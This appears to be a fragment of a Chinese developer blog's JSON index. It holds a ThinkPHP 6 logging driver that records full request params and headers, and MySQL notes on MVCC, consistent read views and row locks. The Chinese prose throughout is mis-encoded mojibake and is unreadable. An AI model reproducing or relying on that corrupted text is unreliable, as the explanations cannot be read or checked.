MicroMessenger&#x2F;8.0.5 Language&#x2F;zh_CN webview&#x2F;&#39;, &#39;content-type&#39; &#x3D;&gt; &#39;application&#x2F;json&#39;, &#39;scene&#39; &#x3D;&gt; &#39;weixin&#39;, &#39;content-length&#39; &#x3D;&gt; &#39;46&#39;, &#39;connection&#39; &#x3D;&gt; &#39;keep-alive&#39;, &#39;host&#39; &#x3D;&gt; &#39;apiv2.smshw.local&#39;,)[ PARAM ] array () ThinkPHP 6.0 åˆ™æ˜¯ç›´æ¥ç æ‰äº†è®°å½•è¯·æ±‚ä¿¡æ¯ã€‚ è¿™é‡Œç›´æ¥æ‹¿ThinkPHP5.x çš„æ—¥å¿—ç±»æºç è¿›è¡Œä¿®æ”¹ï¼Œåœ¨ ThinkPHP6.x ä¸­ä½œä¸ºæ—¥å¿—é©±åŠ¨ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244&lt;?phpdeclare (strict_types=1);namespace app\\handle;use DateTime;use DateTimeZone;use Exception;use think\\App;use think\\contract\\LogHandlerInterface;use think\\facade\\Request;/** * æœ¬åœ°åŒ–è°ƒè¯•è¾“å‡ºåˆ°æ–‡ä»¶ */class Tp6Log implements LogHandlerInterface&#123; /** * é…ç½®å‚æ•° * @var array */ protected $config = [ 'time_format' =&gt; 'c', 'single' =&gt; false, 'file_size' =&gt; 2097152, 'path' =&gt; '', 'apart_level' =&gt; [], 'max_files' =&gt; 0, 'json' =&gt; false, 'json_options' =&gt; JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES, 'format' =&gt; '[%s][%s] %s', ]; protected $app; // å®ä¾‹åŒ–å¹¶ä¼ å…¥å‚æ•° public function __construct(App $app, $config = []) &#123; $this-&gt;app = $app; if (is_array($config)) &#123; $this-&gt;config = array_merge($this-&gt;config, $config); &#125; if (empty($this-&gt;config['format'])) &#123; $this-&gt;config['format'] = '[%s][%s] %s'; &#125; if (empty($this-&gt;config['path'])) &#123; $this-&gt;config['path'] = $app-&gt;getRuntimePath() . 'log'; &#125; if (substr($this-&gt;config['path'], -1) != DIRECTORY_SEPARATOR) &#123; $this-&gt;config['path'] .= DIRECTORY_SEPARATOR; &#125; &#125; /** * æ—¥å¿—å†™å…¥æ¥å£ * @access public * @param array $log æ—¥å¿—ä¿¡æ¯ * @return bool */ public function save(array $log): bool &#123; $destination = $this-&gt;getMasterLogFile(); $path = dirname($destination); !is_dir($path) &amp;&amp; mkdir($path, 0755, true); $info = []; // æ—¥å¿—ä¿¡æ¯å°è£… $time = DateTime::createFromFormat('0.u00 U', microtime())-&gt;setTimezone(new DateTimeZone(date_default_timezone_get()))-&gt;format($this-&gt;config['time_format']); $request = Request::instance(); //æ–°å¢ $requestInfo = [ 'ip' =&gt; $request-&gt;ip(), 'method' =&gt; $request-&gt;method(), 'host' =&gt; $request-&gt;host(), 'uri' =&gt; $request-&gt;url() ]; if(isset($log['sql'][0]) &amp;&amp; strpos('CONNECT',$log['sql'][0]))&#123; &#125; if (!$this-&gt;config['json']) &#123; $debugInfo = [ 'param' =&gt; '[ PARAM ] ' . var_export($request-&gt;param(), true), 'header' =&gt; '[ HEADER ] ' . var_export($request-&gt;header(), true) ]; foreach ($debugInfo as $row) &#123; array_unshift($info, $row); &#125; // å¢åŠ é¢å¤–çš„è°ƒè¯•ä¿¡æ¯ $runtime = round(microtime(true) - $this-&gt;app-&gt;getBeginTime(), 10); $reqs = $runtime &gt; 0 ? number_format(1 / $runtime, 2) : 'âˆ'; $memory_use = number_format((memory_get_usage() - $this-&gt;app-&gt;getBeginMem()) / 1024, 2); $time_str = '[è¿è¡Œæ—¶é—´ï¼š' . number_format($runtime, 6) . 's] [ååç‡ï¼š' . $reqs . 'req/s]'; $memory_str = ' [å†…å­˜æ¶ˆè€—ï¼š' . $memory_use . 'kb]'; $file_load = ' [æ–‡ä»¶åŠ è½½ï¼š' . count(get_included_files()) . ']'; array_unshift($info, $time_str . $memory_str . $file_load); array_unshift($info, \"---------------------------------------------------------------\\r\\n[&#123;$time&#125;] &#123;$requestInfo['ip']&#125; &#123;$requestInfo['method']&#125; &#123;$requestInfo['host']&#125;&#123;$requestInfo['uri']&#125;\"); &#125; foreach ($log as $type =&gt; $val) &#123; $message = []; foreach ($val as $msg) &#123; if (!is_string($msg)) &#123; $msg = var_export($msg, true); &#125; $message[] = $this-&gt;config['json'] ? json_encode(['time' =&gt; $time, 'type' =&gt; $type, 'msg' =&gt; $msg], $this-&gt;config['json_options']) : sprintf($this-&gt;config['format'], $time, $type, $msg); &#125; if (true === $this-&gt;config['apart_level'] || in_array($type, $this-&gt;config['apart_level'])) &#123; //è¿™ä¸€å¥å¾ˆå…³é”®ï¼Œå¯ä»¥ç»™mysqlæˆ–è€…å…¶ä»–ç‹¬ç«‹çš„æ—¥å¿—ï¼Œä¹ŸåŠ ä¸Šè¯·æ±‚å’Œæ—¶é—´ç­‰ä¿¡æ¯ array_unshift($message, \"---------------------------------------------------------------\\r\\n[&#123;$time&#125;] &#123;$requestInfo['ip']&#125; &#123;$requestInfo['method']&#125; &#123;$requestInfo['host']&#125;&#123;$requestInfo['uri']&#125;\"); // ç‹¬ç«‹è®°å½•çš„æ—¥å¿—çº§åˆ« $filename = $this-&gt;getApartLevelFile($path, $type); $this-&gt;write($message, $filename); continue; &#125; $info[$type] = $message; &#125; if ($info) &#123; return $this-&gt;write($info, $destination); &#125; return true; &#125; /** * è·å–ä¸»æ—¥å¿—æ–‡ä»¶å * @access public * @return string */ protected function getMasterLogFile(): string &#123; if ($this-&gt;config['max_files']) &#123; $files = glob($this-&gt;config['path'] . '*.log'); try &#123; if (count($files) &gt; $this-&gt;config['max_files']) &#123; unlink($files[0]); &#125; &#125; catch (Exception $e) &#123; // &#125; &#125; if ($this-&gt;config['single']) &#123; $name = is_string($this-&gt;config['single']) ? $this-&gt;config['single'] : 'single'; $destination = $this-&gt;config['path'] . $name . '.log'; &#125; else &#123; if ($this-&gt;config['max_files']) &#123; $filename = date('Ymd') . '.log'; &#125; else &#123; $filename = date('Ym') . DIRECTORY_SEPARATOR . date('d') . '.log'; &#125; $destination = $this-&gt;config['path'] . $filename; &#125; return $destination; &#125; /** * è·å–ç‹¬ç«‹æ—¥å¿—æ–‡ä»¶å * @access public * @param string $path æ—¥å¿—ç›®å½• * @param string $type æ—¥å¿—ç±»å‹ * @return string */ protected function getApartLevelFile(string $path, string $type): string &#123; if ($this-&gt;config['single']) &#123; $name = is_string($this-&gt;config['single']) ? $this-&gt;config['single'] : 'single'; $name .= '_' . $type; &#125; elseif ($this-&gt;config['max_files']) &#123; $name = date('Ymd') . '_' . $type; &#125; else &#123; $name = date('d') . '_' . $type; &#125; return $path . DIRECTORY_SEPARATOR . $name . '.log'; &#125; /** * æ—¥å¿—å†™å…¥ * @access protected * @param array $message æ—¥å¿—ä¿¡æ¯ * @param string $destination æ—¥å¿—æ–‡ä»¶ * @return bool */ protected function write(array $message, string $destination): bool &#123; // æ£€æµ‹æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œè¶…è¿‡é…ç½®å¤§å°åˆ™å¤‡ä»½æ—¥å¿—æ–‡ä»¶é‡æ–°ç”Ÿæˆ $this-&gt;checkLogSize($destination); $info = []; foreach ($message as $type =&gt; $msg) &#123; $info[$type] = is_array($msg) ? implode(PHP_EOL, $msg) : $msg; &#125; $message = implode(PHP_EOL, $info) . PHP_EOL; return error_log($message, 3, $destination); &#125; /** * æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°å¹¶è‡ªåŠ¨ç”Ÿæˆå¤‡ä»½æ–‡ä»¶ * @access protected * @param string $destination æ—¥å¿—æ–‡ä»¶ * @return void */ protected function checkLogSize(string $destination): void &#123; if (is_file($destination) &amp;&amp; floor($this-&gt;config['file_size']) &lt;= filesize($destination)) &#123; try &#123; rename($destination, dirname($destination) . DIRECTORY_SEPARATOR . time() . '-' . basename($destination)); &#125; catch (Exception $e) &#123; // &#125; &#125; &#125;&#125; ç„¶åå°† config/log.php é…ç½®ä¸­çš„ type è®¾ç½®ä¸º Tp6Log::class ï¼Œä¾¿å¯ä»¥å°†è¯·æ±‚è®°å½•ã€SQL æ‰§è¡Œè®°å½•ã€é”™è¯¯ç­‰ä¿¡æ¯ç»Ÿç»Ÿè®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ å‚è€ƒé“¾æ¥ thinkphp6è‡ªå®šä¹‰æ—¥å¿—é©±åŠ¨,å¢åŠ æ˜¾ç¤ºå…¨éƒ¨è¯·æ±‚ä¿¡æ¯","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"}]},{"title":"08 äº‹åŠ¡åˆ°åº•æ˜¯éš”ç¦»çš„è¿˜æ˜¯ä¸éš”ç¦»çš„","slug":"is-the-transaction-isolated-or-not","date":"2022-06-14T14:44:51.000Z","updated":"2022-06-17T07:35:22.678Z","comments":true,"path":"is-the-transaction-isolated-or-not/","link":"","permalink":"https://www.0x2beace.com/is-the-transaction-isolated-or-not/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„å…¨å±€é” äº†è§£å½“å‰è¯»çš„æ¦‚å¿µ","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„å…¨å±€é” äº†è§£å½“å‰è¯»çš„æ¦‚å¿µ ä¸‹é¢æ˜¯ä¸€ä¸ªåªæœ‰ä¸¤è¡Œçš„è¡¨çš„åˆå§‹åŒ–è¯­å¥ã€‚ 1234567CREATE TABLE &#96;t&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;k&#96; int(11) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB;insert into t(id, k) values(1,1),(2,2); åœ¨å¦‚å›¾æ‰€ç¤ºçš„äº‹åŠ¡å¯åŠ¨æ—¶æœºä¸‹ï¼Œæœ€ç»ˆäº‹åŠ¡ B æŸ¥åˆ°çš„ k çš„å€¼æ˜¯ 3ï¼Œè€Œäº‹åŠ¡ A æŸ¥åˆ°çš„ k çš„å€¼æ˜¯ 1ã€‚ åœ¨ MySQL é‡Œï¼Œæœ‰ä¸¤ä¸ªâ€œè§†å›¾â€çš„æ¦‚å¿µï¼š ä¸€ä¸ªæ˜¯ viewã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨æŸ¥è¯¢è¯­å¥å®šä¹‰çš„è™šæ‹Ÿè¡¨ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™æ‰§è¡ŒæŸ¥è¯¢è¯­å¥å¹¶ç”Ÿæˆç»“æœã€‚åˆ›å»ºè§†å›¾çš„è¯­æ³•æ˜¯ create view â€¦ ï¼Œè€Œå®ƒçš„æŸ¥è¯¢æ–¹æ³•ä¸è¡¨ä¸€æ ·ã€‚ å¦ä¸€ä¸ªæ˜¯ InnoDB åœ¨å®ç° MVCC æ—¶ç”¨åˆ°çš„ä¸€è‡´æ€§è¯»è§†å›¾ï¼Œå³ consistent read viewï¼Œç”¨äºæ”¯æŒ RCï¼ˆRead Committedï¼Œè¯»æäº¤ï¼‰å’Œ RRï¼ˆRepeatable Readï¼Œå¯é‡å¤è¯»ï¼‰éš”ç¦»çº§åˆ«çš„å®ç°ã€‚ ä¸€è‡´æ€§è¯»è§†å›¾å®ƒæ²¡æœ‰ç‰©ç†ç»“æ„ï¼Œä½œç”¨æ˜¯äº‹åŠ¡æ‰§è¡ŒæœŸé—´ç”¨æ¥å®šä¹‰â€œæˆ‘èƒ½çœ‹åˆ°ä»€ä¹ˆæ•°æ®â€ã€‚ â€œå¿«ç…§â€åœ¨ MVCC é‡Œæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼ŸInnoDB é‡Œé¢æ¯ä¸ªäº‹åŠ¡æœ‰ä¸€ä¸ªå”¯ä¸€çš„äº‹åŠ¡ IDï¼Œå«ä½œ transaction idã€‚å®ƒæ˜¯åœ¨äº‹åŠ¡å¼€å§‹çš„æ—¶å€™å‘ InnoDB çš„äº‹åŠ¡ç³»ç»Ÿç”³è¯·çš„ï¼Œæ˜¯æŒ‰ç”³è¯·é¡ºåºä¸¥æ ¼é€’å¢çš„ã€‚ æ•°æ®è¡¨ä¸­çš„ä¸€è¡Œè®°å½•ï¼Œå…¶å®å¯èƒ½æœ‰å¤šä¸ªç‰ˆæœ¬ (row)ï¼Œæ¯ä¸ªç‰ˆæœ¬æœ‰è‡ªå·±çš„ row trx_idã€‚ æŒ‰ç…§å¯é‡å¤è¯»çš„å®šä¹‰ï¼Œä¸€ä¸ªäº‹åŠ¡å¯åŠ¨çš„æ—¶å€™ï¼Œèƒ½å¤Ÿçœ‹åˆ°æ‰€æœ‰å·²ç»æäº¤çš„äº‹åŠ¡ç»“æœã€‚ä½†æ˜¯ä¹‹åï¼Œè¿™ä¸ªäº‹åŠ¡æ‰§è¡ŒæœŸé—´ï¼Œå…¶ä»–äº‹åŠ¡çš„æ›´æ–°å¯¹å®ƒä¸å¯è§ã€‚ å› æ­¤ï¼Œä¸€ä¸ªäº‹åŠ¡åªéœ€è¦åœ¨å¯åŠ¨çš„æ—¶å€™å£°æ˜è¯´ï¼š ä»¥æˆ‘å¯åŠ¨çš„æ—¶åˆ»ä¸ºå‡†ï¼Œå¦‚æœä¸€ä¸ªæ•°æ®ç‰ˆæœ¬æ˜¯åœ¨æˆ‘å¯åŠ¨ä¹‹å‰ç”Ÿæˆçš„ï¼Œå°±è®¤ã€‚ å¦‚æœæ˜¯æˆ‘å¯åŠ¨ä»¥åæ‰ç”Ÿæˆçš„ï¼Œæˆ‘å°±ä¸è®¤ï¼Œæˆ‘å¿…é¡»è¦æ‰¾åˆ°å®ƒçš„ä¸Šä¸€ä¸ªç‰ˆæœ¬ã€‚ å½“ç„¶ï¼Œå¦‚æœâ€œä¸Šä¸€ä¸ªç‰ˆæœ¬â€ä¹Ÿä¸å¯è§ï¼Œé‚£å°±å¾—ç»§ç»­å¾€å‰æ‰¾ã€‚è¿˜æœ‰ï¼Œå¦‚æœæ˜¯è¿™ä¸ªäº‹åŠ¡è‡ªå·±æ›´æ–°çš„æ•°æ®ï¼Œå®ƒè‡ªå·±è¿˜æ˜¯è¦è®¤çš„ã€‚ åœ¨å®ç°ä¸Šï¼Œ InnoDB ä¸ºæ¯ä¸ªäº‹åŠ¡æ„é€ äº†ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥ä¿å­˜è¿™ä¸ªäº‹åŠ¡å¯åŠ¨ç¬é—´ï¼Œå½“å‰æ­£åœ¨â€œæ´»è·ƒâ€çš„æ‰€æœ‰äº‹åŠ¡ IDã€‚â€œæ´»è·ƒâ€æŒ‡çš„å°±æ˜¯ï¼Œå¯åŠ¨äº†ä½†è¿˜æ²¡æäº¤ã€‚ æ•°ç»„é‡Œé¢äº‹åŠ¡ ID çš„æœ€å°å€¼è®°ä¸ºä½æ°´ä½ï¼Œå½“å‰ç³»ç»Ÿé‡Œé¢å·²ç»åˆ›å»ºè¿‡çš„äº‹åŠ¡ ID çš„æœ€å¤§å€¼åŠ  1 è®°ä¸ºé«˜æ°´ä½ã€‚ è¿™ä¸ªè§†å›¾æ•°ç»„å’Œé«˜æ°´ä½ï¼Œå°±ç»„æˆäº†å½“å‰äº‹åŠ¡çš„ä¸€è‡´æ€§è§†å›¾ï¼ˆread-viewï¼‰ã€‚ æ•°æ®å‹ç‰ˆæœ¬çš„å¯è§æ€§è§„åˆ™ï¼ˆåŸºäºæ•°æ®çš„ row trx_id å’Œè¿™ä¸ªä¸€è‡´æ€§è§†å›¾çš„å¯¹æ¯”ç»“æœå¾—åˆ°ï¼‰ï¼š è¿™æ ·ï¼Œå¯¹äºå½“å‰äº‹åŠ¡çš„å¯åŠ¨ç¬é—´æ¥è¯´ï¼Œä¸€ä¸ªæ•°æ®ç‰ˆæœ¬çš„ row trx_idï¼Œæœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š å¦‚æœè½åœ¨ç»¿è‰²éƒ¨åˆ†ï¼Œè¡¨ç¤ºè¿™ä¸ªç‰ˆæœ¬æ˜¯å·²æäº¤çš„äº‹åŠ¡æˆ–è€…æ˜¯å½“å‰äº‹åŠ¡è‡ªå·±ç”Ÿæˆçš„ï¼Œè¿™ä¸ªæ•°æ®æ˜¯å¯è§çš„ï¼›å¦‚æœè½åœ¨çº¢è‰²éƒ¨åˆ†ï¼Œè¡¨ç¤ºè¿™ä¸ªç‰ˆæœ¬æ˜¯ç”±å°†æ¥å¯åŠ¨çš„äº‹åŠ¡ç”Ÿæˆçš„ï¼Œæ˜¯è‚¯å®šä¸å¯è§çš„ï¼›å¦‚æœè½åœ¨é»„è‰²éƒ¨åˆ†ï¼Œé‚£å°±åŒ…æ‹¬ä¸¤ç§æƒ…å†µa. è‹¥ row trx_id åœ¨æ•°ç»„ä¸­ï¼Œè¡¨ç¤ºè¿™ä¸ªç‰ˆæœ¬æ˜¯ç”±è¿˜æ²¡æäº¤çš„äº‹åŠ¡ç”Ÿæˆçš„ï¼Œä¸å¯è§ï¼›b. è‹¥ row trx_id ä¸åœ¨æ•°ç»„ä¸­ï¼Œè¡¨ç¤ºè¿™ä¸ªç‰ˆæœ¬æ˜¯å·²ç»æäº¤äº†çš„äº‹åŠ¡ç”Ÿæˆçš„ï¼Œå¯è§ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹ä¸€ä¸‹å›¾ 1 ä¸­çš„ä¸‰ä¸ªäº‹åŠ¡ï¼Œåˆ†æä¸‹äº‹åŠ¡ A çš„è¯­å¥è¿”å›çš„ç»“æœï¼Œä¸ºä»€ä¹ˆæ˜¯ k=1ã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬ä¸å¦¨åšå¦‚ä¸‹å‡è®¾ï¼š äº‹åŠ¡ A å¼€å§‹å‰ï¼Œç³»ç»Ÿé‡Œé¢åªæœ‰ä¸€ä¸ªæ´»è·ƒäº‹åŠ¡ ID æ˜¯ 99ï¼› äº‹åŠ¡ Aã€Bã€C çš„ç‰ˆæœ¬å·åˆ†åˆ«æ˜¯ 100ã€101ã€102ï¼Œä¸”å½“å‰ç³»ç»Ÿé‡Œåªæœ‰è¿™å››ä¸ªäº‹åŠ¡ï¼› ä¸‰ä¸ªäº‹åŠ¡å¼€å§‹å‰ï¼Œ(1,1ï¼‰è¿™ä¸€è¡Œæ•°æ®çš„ row trx_id æ˜¯ 90ã€‚ è¿™æ ·ï¼Œäº‹åŠ¡ A çš„è§†å›¾æ•°ç»„å°±æ˜¯ [99,100], äº‹åŠ¡ B çš„è§†å›¾æ•°ç»„æ˜¯ [99,100,101], äº‹åŠ¡ C çš„è§†å›¾æ•°ç»„æ˜¯ [99,100,101,102]ã€‚ ä¸ºäº†ç®€åŒ–åˆ†æï¼Œå…ˆæŠŠå…¶ä»–å¹²æ‰°è¯­å¥å»æ‰ï¼Œåªç”»å‡ºè·Ÿäº‹åŠ¡ A æŸ¥è¯¢é€»è¾‘æœ‰å…³çš„æ“ä½œï¼š ä¸€ä¸ªæ•°æ®ç‰ˆæœ¬ï¼Œå¯¹äºä¸€ä¸ªäº‹åŠ¡è§†å›¾æ¥è¯´ï¼Œé™¤äº†è‡ªå·±çš„æ›´æ–°æ€»æ˜¯å¯è§ä»¥å¤–ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š ç‰ˆæœ¬æœªæäº¤ï¼Œä¸å¯è§ ç‰ˆæœ¬å·²æäº¤ï¼Œä½†æ˜¯æ˜¯åœ¨è§†å›¾åˆ›å»ºåæäº¤çš„ï¼Œä¸å¯è§ ç‰ˆæœ¬å·²æäº¤ï¼Œè€Œä¸”æ˜¯åœ¨è§†å›¾åˆ›å»ºå‰æäº¤çš„ï¼Œå¯è§ æœ‰äº†è¿™ä¸ªè§„åˆ™ä¹‹åï¼Œå¯ä»¥å°è¯•åˆ¤æ–­äº‹åŠ¡ A çš„æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢è¿‡ç¨‹ï¼š (1,3) å½“å‰ç‰ˆæœ¬è¿˜æœªæäº¤ï¼Œå±äºæƒ…å†µ 1ï¼Œä¸å¯è§ (1,2) å†å²ç‰ˆæœ¬å·²ç»æäº¤ï¼Œä½†æ˜¯æ˜¯åœ¨è§†å›¾æ•°ç»„åˆ›å»ºä¹‹åæäº¤çš„ï¼Œå±äºæƒ…å†µ 2ï¼Œä¸å¯è§ (1,1) æ˜¯åœ¨è§†å›¾æ•°ç»„åˆ›å»ºä¹‹å‰æäº¤çš„ï¼Œå¯è§ æ›´æ–°é€»è¾‘æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘ï¼Œé‚£äº‹åŠ¡ B çš„å€¼åº”è¯¥æ˜¯ 2 æ‰å¯¹ï¼Œå¯æœ€åæ€ä¹ˆåˆå˜æˆäº† 3 å‘¢ï¼Ÿ æ˜¯çš„ï¼Œå¦‚æœäº‹åŠ¡ B åœ¨æ›´æ–°ä¹‹å‰æŸ¥è¯¢ä¸€æ¬¡æ•°æ®ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿”å›çš„ k çš„å€¼ç¡®å®æ˜¯ 1ã€‚ ä½†æ˜¯ï¼Œå½“å®ƒè¦å»æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œå°±ä¸èƒ½å†åœ¨å†å²ç‰ˆæœ¬ä¸Šæ›´æ–°äº†ï¼Œå¦åˆ™äº‹åŠ¡ C çš„æ›´æ–°å°±ä¸¢å¤±äº†ã€‚å› æ­¤ï¼Œäº‹åŠ¡ B æ­¤æ—¶çš„ set k=k+1 æ˜¯åœ¨ï¼ˆ1,2ï¼‰çš„åŸºç¡€ä¸Šè¿›è¡Œçš„æ“ä½œã€‚ æ‰€ä»¥ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†è¿™æ ·ä¸€æ¡è§„åˆ™ï¼šæ›´æ–°æ•°æ®éƒ½æ˜¯å…ˆè¯»åå†™çš„ï¼Œè€Œè¿™ä¸ªè¯»ï¼Œåªèƒ½è¯»å½“å‰çš„å€¼ï¼Œç§°ä¸ºâ€œå½“å‰è¯»â€ï¼ˆcurrent readï¼‰ã€‚ å› æ­¤ï¼Œåœ¨æ›´æ–°çš„æ—¶å€™ï¼Œå½“å‰è¯»æ‹¿åˆ°çš„æ•°æ®æ˜¯ (1,2)ï¼Œæ›´æ–°åç”Ÿæˆäº†æ–°ç‰ˆæœ¬çš„æ•°æ® (1,3)ï¼Œè¿™ä¸ªæ–°ç‰ˆæœ¬çš„ row trx_id æ˜¯ 101ã€‚ æ‰€ä»¥ï¼Œåœ¨æ‰§è¡Œäº‹åŠ¡ B æŸ¥è¯¢è¯­å¥çš„æ—¶å€™ï¼Œä¸€çœ‹è‡ªå·±çš„ç‰ˆæœ¬å·æ˜¯ 101ï¼Œæœ€æ–°æ•°æ®çš„ç‰ˆæœ¬å·ä¹Ÿæ˜¯ 101ï¼Œæ˜¯è‡ªå·±çš„æ›´æ–°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥æŸ¥è¯¢å¾—åˆ°çš„ k çš„å€¼æ˜¯ 3ã€‚ æ€»ç»“ åœ¨å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹ï¼Œäº‹åŠ¡å¯åŠ¨æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªä¸€è‡´æ€§è§†å›¾ read-view begin/start transaction å‘½ä»¤å¹¶ä¸æ˜¯ä¸€ä¸ªäº‹åŠ¡çš„èµ·ç‚¹ï¼Œåœ¨æ‰§è¡Œåˆ°å®ƒä»¬ä¹‹åçš„ç¬¬ä¸€ä¸ªæ“ä½œ InnoDB è¡¨çš„è¯­å¥ï¼Œäº‹åŠ¡æ‰çœŸæ­£å¯åŠ¨ã€‚ åœ¨ autocommit=1 æ—¶ï¼Œç›´æ¥æ‰§è¡Œä¸€ä¸ª update è¯­å¥ï¼Œè¡¨ç¤ºè¿™ä¸ª update è¯­å¥æœ¬èº«å°±æ˜¯ä¸€ä¸ªäº‹åŠ¡ï¼Œè¯­å¥å®Œæˆçš„æ—¶å€™ä¼šè‡ªåŠ¨æäº¤äº‹åŠ¡ã€‚ æ¯æ¬¡äº‹åŠ¡æ›´æ–°æ•°æ®æ—¶ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ•°æ®ç‰ˆæœ¬ï¼Œå¹¶ä¸”æŠŠ transaction idï¼ˆå”¯ä¸€çš„äº‹åŠ¡ IDï¼‰ èµ‹å€¼ç»™è¿™ä¸ªæ•°æ®ç‰ˆæœ¬çš„äº‹åŠ¡ IDï¼Œè®°ä¸º row trx_idã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"07 è¡Œé”åŠŸè¿‡:æ€ä¹ˆå‡å°‘è¡Œé”å¯¹æ€§èƒ½çš„å½±å“","slug":"row-lock-merits-and-demerits-how-to-reduce-the-impact-of-row-locks-on-performance","date":"2022-06-13T13:57:32.000Z","updated":"2022-06-27T08:17:37.104Z","comments":true,"path":"row-lock-merits-and-demerits-how-to-reduce-the-impact-of-row-locks-on-performance/","link":"","permalink":"https://www.0x2beace.com/row-lock-merits-and-demerits-how-to-reduce-the-impact-of-row-locks-on-performance/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„è¡Œé” ç†è§£ä¸¤é˜¶æ®µé”åè®® äº†è§£æ­»é”åŠæ­»é”æ£€æµ‹","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„è¡Œé” ç†è§£ä¸¤é˜¶æ®µé”åè®® äº†è§£æ­»é”åŠæ­»é”æ£€æµ‹ MySQL çš„è¡Œé”æ˜¯åœ¨å¼•æ“å±‚ç”±å„ä¸ªå¼•æ“è‡ªå·±å®ç°çš„ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„å¼•æ“éƒ½æ”¯æŒè¡Œé”ï¼Œæ¯”å¦‚ MyISAM å¼•æ“å°±ä¸æ”¯æŒè¡Œé”ã€‚ ä¸æ”¯æŒè¡Œé”æ„å‘³ç€å¹¶å‘æ§åˆ¶åªèƒ½ä½¿ç”¨è¡¨é”ï¼Œå¯¹äºè¿™ç§å¼•æ“çš„è¡¨ï¼ŒåŒä¸€å¼ è¡¨ä¸Šä»»ä½•æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªæ›´æ–°åœ¨æ‰§è¡Œï¼Œè¿™å°±ä¼šå½±å“åˆ°ä¸šåŠ¡å¹¶å‘åº¦ã€‚InnoDB æ˜¯æ”¯æŒè¡Œé”çš„ï¼Œè¿™ä¹Ÿæ˜¯ MyISAM è¢« InnoDB æ›¿ä»£çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚ é¡¾åæ€ä¹‰ï¼Œè¡Œé”å°±æ˜¯é’ˆå¯¹æ•°æ®è¡¨ä¸­è¡Œè®°å½•çš„é”ã€‚è¿™å¾ˆå¥½ç†è§£ï¼Œæ¯”å¦‚äº‹åŠ¡ A æ›´æ–°äº†ä¸€è¡Œï¼Œè€Œ è¿™æ—¶å€™äº‹åŠ¡ B 